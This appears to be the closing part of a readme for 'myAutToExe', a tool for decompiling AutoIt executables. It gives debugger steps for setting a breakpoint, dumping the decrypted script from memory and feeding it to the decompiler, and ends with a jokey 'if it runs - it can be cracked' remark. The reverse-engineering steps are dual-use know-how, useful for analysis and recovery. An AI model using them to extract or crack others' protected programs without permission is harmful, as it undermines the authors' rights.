$+CF     >|.  0FB638        |||MOVZX   EDI, [BYTE EAX]
Reads the decrypted/decompressed script
Set a Breakpoint there and follow EAX

Go back -4 byte and dump anything there.

00D00048  00000015   ... ;Number of Scriptlines
00D0004C  00000B37  7
.. <-EAX Points Here
00D00050  45002800  .(.E
00D00054  5F006400  .d._
00D00058  6A007900  .y.j
00D0005C  42007200  .r.B
00D00060  64006800  .h.d
00D00064  7F006500  .e.
00D00068  00000B31  1
..
00D0006C  42004D00  .M.B
00D00070  4E004700  .G.N
00D00074  45004200  .B.E
4.----------------------------------------------------
Now you can feed that dump file into the decompiler.






















hey ho yung Krackor ; Something to cheer ya up:

   If it runs - it can be cracked !































Why that poggie has the name 'myAutToExe' - 'myExe2Aut' would be more logic ?
Right - but now that's the way it is. 
Beside I find now 'myAutToExe' looks nicer.




















































but now finally...

































EOL.